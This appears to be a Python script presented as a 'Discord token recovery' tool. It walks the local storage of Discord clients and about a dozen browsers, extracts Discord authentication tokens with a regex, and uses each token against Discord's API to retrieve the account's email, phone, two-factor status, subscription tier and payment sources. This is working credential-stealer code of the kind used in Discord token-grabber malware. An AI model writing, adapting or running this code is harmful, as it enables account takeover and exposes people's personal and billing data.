import os
import re
import logging
import concurrent.futures
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import win32crypt
from win32crypt import CryptUnprotectData
import requests

logging.basicConfig(level=logging.INFO, format="%(message)s")

class DiscordTokenRecovery:

    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")

    PATHS = {
        "Discord": os.path.join(ROAMING, "Discord"),
        "Vencord": os.path.join(ROAMING, "Vencord"),
        "Discord Canary": os.path.join(ROAMING, "discordcanary"),
        "Discord PTB": os.path.join(ROAMING, "discordptb"),
        "Google Chrome": os.path.join(LOCAL, "Google", "Chrome", "User Data", "Default"),
        "Opera": os.path.join(ROAMING, "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(ROAMING, "Opera Software", "Opera GX Stable"),
        "Brave": os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
        "Yandex": os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data", "Default"),
        "Firefox": os.path.join(ROAMING, "Mozilla", "Firefox", "Profiles"),
        "Edge": os.path.join(LOCAL, "Microsoft", "Edge", "User Data", "Default"),
        "Chromium": os.path.join(LOCAL, "Chromium", "User Data", "Default"),
        "Vivaldi": os.path.join(LOCAL, "Vivaldi", "User Data", "Default"),
        "Safari": os.path.join(LOCAL, "Apple", "Safari"),
    }

    def __init__(self):
        pass

    def _decrypt(self, buff, master_key):
        try:
            cipher = AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15])
            decrypted_data = unpad(cipher.decrypt(buff[15:]), AES.block_size)
            return decrypted_data.decode()
        except Exception as e:
            logging.error(f"Decryption error: {e}")
            return None

    def _get_tokens(self, path):
        path = os.path.join(path, "Local Storage", "leveldb")
        tokens = []

        if not os.path.exists(path):
            return tokens

        # Adjusting the token pattern to match the new and previous example tokens
        token_pattern = re.compile(rb"[A-Za-z0-9+/=]{20,}\.[A-Za-z0-9_-]{6,8}\.[A-Za-z0-9_-]{20,}")

        for file_name in os.listdir(path):
            if not file_name.endswith((".log", ".ldb")):
                continue

            with open(os.path.join(path, file_name), "rb") as file:
                content = file.read()
                potential_tokens = token_pattern.findall(content)
                for pt in potential_tokens:
                    tokens.append(pt.decode(errors='ignore'))

        return tokens

    def get_user_data(self, token):
        """Fetches user data and payment sources associated with the token."""
        USER_AGENTS = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15"
        ]

        user_data = None
        payment_sources = []

        for user_agent in USER_AGENTS:
            headers = {
                "Authorization": token,
                "User-Agent": user_agent
            }

            try:
                user_response = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
                if user_response.status_code == 200:
                    user_data = user_response.json()
                    billing_response = requests.get("https://discord.com/api/users/@me/billing/payment-sources", headers=headers, timeout=10)
                    if billing_response.status_code == 200:
                        payment_sources_data = billing_response.json()
                        payment_sources = [method for method in payment_sources_data if not method["invalid"]]
                    else:
                        logging.error(f"Failed to retrieve payment sources for token {token} with User-Agent: {user_agent}")
                else:
                    logging.error(f"Failed to retrieve user data for token {token} with User-Agent: {user_agent}")
                    continue
                break
            except requests.Timeout:
                logging.warning(f"Request timed out for token {token} with User-Agent: {user_agent}")
                continue

        if not user_data:
            logging.error(f"Exhausted all User-Agents for token {token}")
            return None

        return {
            "username": user_data["username"],
            "discriminator": user_data["discriminator"],
            "email": user_data["email"],
            "phone": user_data.get("phone", "Not available"),
            "locale": user_data.get("locale", "Not available"),
            "mfa_enabled": user_data.get("mfa_enabled", False),
            "avatar": user_data.get("avatar"),
            "flags": user_data.get("flags"),
            "public_flags": user_data.get("public_flags"),
            "premium_type": user_data.get("premium_type", 0),
            "payment_sources": payment_sources
        }

    def _print_tokens(self, tokens):
        for token in tokens:
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except Exception as e:
                    logging.error(f"Base64 decoding error: {e}")

                user_data = self.get_user_data(token)

                print("═" * 26 + " Discord Token " + "═" * 27)
                print(f"🔑 Token: {token}")
                print(f"🪪  User ID: {uid}")
                if user_data:
                    print(f"👤 Username: {user_data['username']}#{user_data['discriminator']}")
                    print(f"📧 Email: {user_data['email']}")
                    print(f"📞 Phone: {user_data['phone']}")
                    print(f"🌐 Locale: {user_data['locale']}")
                    print(f"🔐 Two-Factor Auth: {'Enabled' if user_data['mfa_enabled'] else 'Disabled'}")
                    premium = {
                        0: "None",
                        1: "Nitro Classic",
                        2: "Nitro"
                    }.get(user_data['premium_type'], "Unknown")
                    print(f"🌟 Premium: {premium}")

                    # Printing payment sources
                    if 'payment_sources' in user_data and user_data['payment_sources']:
                        print("💵 Payment Sources:")
                        for source in user_data['payment_sources']:
                            payment_type = {
                                1: "Credit Card",
                                2: "PayPal",
                            }.get(source['type'], "Unknown")
                            print(f"   - Type: {payment_type} (Valid: {'Yes' if not source['invalid'] else 'No'})")
                    else:
                        print("💵 No Valid Payment Sources Found")

                print("═" * 68)
            else:
                print("═" * 68)
                print(f"🔑 Token: {token}")
                print("═" * 68)


    def extract_tokens(self, paths=PATHS.values()):
        tokens = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=len(paths)) as executor:
            future_to_path = {executor.submit(self._get_tokens, path): path for path in paths}
            for future in concurrent.futures.as_completed(future_to_path):
                path = future_to_path[future]
                try:
                    tokens.extend(future.result())
                except Exception as e:
                    logging.error(f"Error extracting tokens from {path}: {e}")

        self._print_tokens(tokens)